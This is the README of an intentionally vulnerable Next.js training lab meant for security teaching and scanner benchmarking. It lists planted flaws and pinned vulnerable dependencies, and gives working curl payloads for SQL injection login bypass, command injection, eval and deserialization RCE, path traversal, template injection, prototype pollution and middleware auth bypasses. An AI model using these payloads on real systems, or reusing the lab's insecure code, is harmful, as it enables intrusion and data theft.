# VulnLab — an intentionally vulnerable Next.js monorepo

> ## ⚠ READ THIS FIRST
>
> Every file in this repository is **deliberately insecure**. It exists to be a
> target: for security training, for benchmarking SAST/DAST/SCA tooling, and for
> practising exploitation in a controlled setting.
>
> - **Do not deploy it.** Do not expose it to a LAN, a container network, or the
>   internet. The dev/start scripts bind to `127.0.0.1` on purpose.
> - **Do not copy code from it** into anything real.
> - Run it in a throwaway VM or container if you plan to trigger the RCE paths —
>   several endpoints will execute arbitrary commands as your user.
> - Every credential, API key and token in this repo is **fake**.

---

## What it is

An npm-workspaces monorepo: one Next.js 14 app plus six local packages. The
vulnerabilities live **inside the packages**, and the app wires them up to HTTP
endpoints so each one is reachable and demonstrable.

```
vuln-next-lab/
├── apps/
│   └── web/                  Next.js 14 App Router — pages + 15 API routes
│       ├── app/              UI pages and route handlers
│       ├── middleware.js     broken auth gate (5 distinct bypasses)
│       └── next.config.js    insecure CORS / CSP / headers
├── packages/
│   ├── db/                   SQLi, NoSQLi, prototype pollution, XXE
│   ├── auth/                 JWT, MD5 hashing, session cookies, timing oracle
│   ├── utils/                command injection, traversal, SSRF, RCE, SSTI
│   ├── ui/                   React XSS sinks
│   ├── logger/               secret leakage, log injection
│   └── api-client/           TLS verification off, hardcoded keys, cleartext
└── .env.example              template only — contains no credentials
```

**131 numbered findings across 61 distinct CWEs**, plus **30 dependency CVEs**
(9 critical / 17 high / 3 moderate / 1 low as of the pinned lockfile).

### No credentials in this repo

There are no `.env` files here and no provider-shaped secrets anywhere in the
tree. `.env` is gitignored; copy `.env.example` to `apps/web/.env` and use
throwaway values if you want to exercise the secret-exposure routes.

This trims the lab's value as a **secret-scanning** target specifically — the
two findings that depended on committed `.env` files (`V-ENV-01`, `V-ENV-03`)
are gone. Every other finding is unaffected: the hardcoded-credential
anti-patterns in `packages/auth` (`JWT_SECRET = "secret123"`) and
`packages/api-client` are still there and still served to unauthenticated
callers by `GET /api/debug`. If you want the secret-scanning cases back, put
realistic throwaway values in a local `apps/web/.env` — it will not be committed.

Every finding carries a stable ID in a code comment right above the vulnerable
line:

```js
/**
 * V-UT-01 (CWE-78) — user input concatenated into a shell command.
 * Exploit: host = "127.0.0.1 && whoami"
 */
```

The full catalogue with file paths and reproduction steps is in
[VULNERABILITIES.md](./VULNERABILITIES.md).

---

## Running it

```bash
npm install
npm run build
npm start          # http://127.0.0.1:3000
```

or `npm run dev` for the dev server. Node 18+ (tested on Node 24 / npm 11 /
Windows 11).

The home page at `/` is an index of every vulnerability class with links
straight to a working exploit. `/tools` has a form for each endpoint.

### Seeded accounts

| email | password | role |
|---|---|---|
| `alice@vulnlab.test` | `password` | user |
| `bob@vulnlab.test` | `123456` | user |
| `root@vulnlab.test` | `admin` | admin |

---

## Verified exploits

These were run against the built app; all output below is real.

**SQL injection → authentication bypass** (`V-API-01`, CWE-89)

```bash
curl "http://127.0.0.1:3000/api/login?email=root%40vulnlab.test'%20--&password=totally-wrong"
# {"ok":true,"user":{"id":3,"email":"root@vulnlab.test","role":"admin"},"token":"eyJ..."}
```

**OS command injection** (`V-UT-01`, CWE-78)

```bash
curl "http://127.0.0.1:3000/api/ping?host=127.0.0.1%20%26%26%20whoami"
# "cmd":"ping -n 1 127.0.0.1 && whoami", "stdout":"... predator\\shada"
```

**eval() RCE** (`V-API-24`, CWE-95)

```bash
curl -X POST http://127.0.0.1:3000/api/calc -H 'content-type: application/json' \
  -d '{"expr":"require(\"child_process\").execSync(\"whoami\").toString()"}'
```

**Insecure deserialization RCE** (`V-API-28`, CWE-502, node-serialize 0.0.4)

```bash
curl -X POST http://127.0.0.1:3000/api/deserialize -H 'content-type: application/json' \
  -d '{"payload":"{\"x\":\"_$$ND_FUNC$$_function(){return process.pid}()\"}"}'
```

**Path traversal out of the upload root** (`V-API-16`, CWE-22)

```bash
curl "http://127.0.0.1:3000/api/files?name=../../../package.json"
curl "http://127.0.0.1:3000/api/files?name=../../../packages/auth/index.js"  # → JWT_SECRET
```

**Server-side template injection** (`V-API-26`, CWE-1336)

```bash
curl "http://127.0.0.1:3000/api/render?engine=ejs&template=%3C%25%3D%20process.pid%20%25%3E"
```

**Prototype pollution** (`V-API-31`, CWE-1321) — see the warning below

```bash
curl -X POST http://127.0.0.1:3000/api/config -H 'content-type: application/json' \
  -d '{"patch":{"__proto__":{"polluted":"yes"}}}'
# "pollutionCheck":{"polluted":"yes"}   ← a fresh {} now carries the property
```

**IDOR + mass assignment** (`V-API-09`/`V-API-10`, CWE-639/CWE-915)

```bash
curl http://127.0.0.1:3000/api/users/3                       # admin's SSN, unauthenticated
curl -X PATCH http://127.0.0.1:3000/api/users/2 \
  -H 'content-type: application/json' -d '{"role":"admin","balance":999999999}'
```

**Five independent middleware auth bypasses** (`V-MW-01`…`V-MW-04`)

| request | result |
|---|---|
| *(no session)* | `307` → `/login` ✅ gate works |
| `x-middleware-subrequest: 1` | `200` — CVE-2025-29927 shape |
| `x-forwarded-for: 10.0.0.5` | `200` — spoofed "internal" traffic |
| `cookie: is_admin=true` | `200` — client-controlled gate |
| `cookie: session=<unsigned JWT>` | `200` — signature never verified |
| `GET /admin/users` | `200` — matcher only covers `/admin` |

### ⚠ Prototype pollution wedges the process

`POST /api/config` with a `__proto__` payload really does pollute
`Object.prototype`. webpack's module loader iterates descriptor objects with
`for…in` and calls `Object.defineProperty`, so the polluted key lands in a
property descriptor and every subsequent module load throws
`TypeError: Getter must be a function`. The app returns `500` on most routes
until you restart it.

That is not a bug in the lab — it is the vulnerability's real impact
(pollution → denial of service). **Restart the server after testing it.**

---

## Vulnerable dependencies

Pinned on purpose. `npm audit` reports 30 advisories.

| package | pinned | why |
|---|---|---|
| `next` | 14.2.3 | middleware auth bypass (CVE-2025-29927), SSRF, cache poisoning |
| `node-serialize` | 0.0.4 | RCE through IIFE payloads |
| `handlebars` | 4.0.11 | prototype pollution → arbitrary code execution |
| `ejs` | 3.1.6 | template injection (CVE-2022-29078) |
| `js-yaml` | 3.13.0 | code execution via `!!js/function` |
| `lodash` | 4.17.15 | prototype pollution, command injection |
| `jsonwebtoken` | 8.5.1 | signature validation bypass |
| `axios` | 0.21.1 | SSRF, ReDoS, credential leakage on redirect |
| `marked` | 0.3.6 | XSS and ReDoS |
| `dompurify` | 2.0.7 | multiple sanitizer bypasses |
| `request` | 2.88.0 | SSRF; package is deprecated and unmaintained |
| `qs` | 6.5.1 | prototype pollution |
| `xml2js` | 0.4.19 | prototype pollution |
| `semver` | 5.7.1 | ReDoS |
| `moment` | 2.19.3 | path traversal, ReDoS |
| `serialize-javascript` | 1.9.0 | XSS |
| `minimist` | 1.2.0 | prototype pollution |
| `cookie` | 0.4.0 | out-of-bounds characters accepted |

Do **not** run `npm audit fix` — it defeats the point of the lab.

---

## Two notes on fidelity

**One thing is not a planted flaw.** `next.config.js` has a `webpack.resolve.fallback`
block stubbing out `react-native-fs` / `react-native-fetch-blob`. alasql ships
optional React Native requires that break the server bundle; the stub is build
plumbing, and it is commented as such.

**One check was retargeted.** The middleware's "trusted internal network" bypass
originally compared `x-forwarded-for` to `127.0.0.1`. Next.js populates that
header itself for local requests, so the bypass fired on *every* request and
masked the other four. It now matches `10.` / `192.168.` prefixes — still fully
spoofable, still CWE-290, but no longer self-triggering.

---

## Cleaning up

`logs/` and `user-files/` are created at runtime and are gitignored. If you
exercise the traversal-on-write or upload endpoints, check for files written
outside `user-files/` before you reuse the directory.
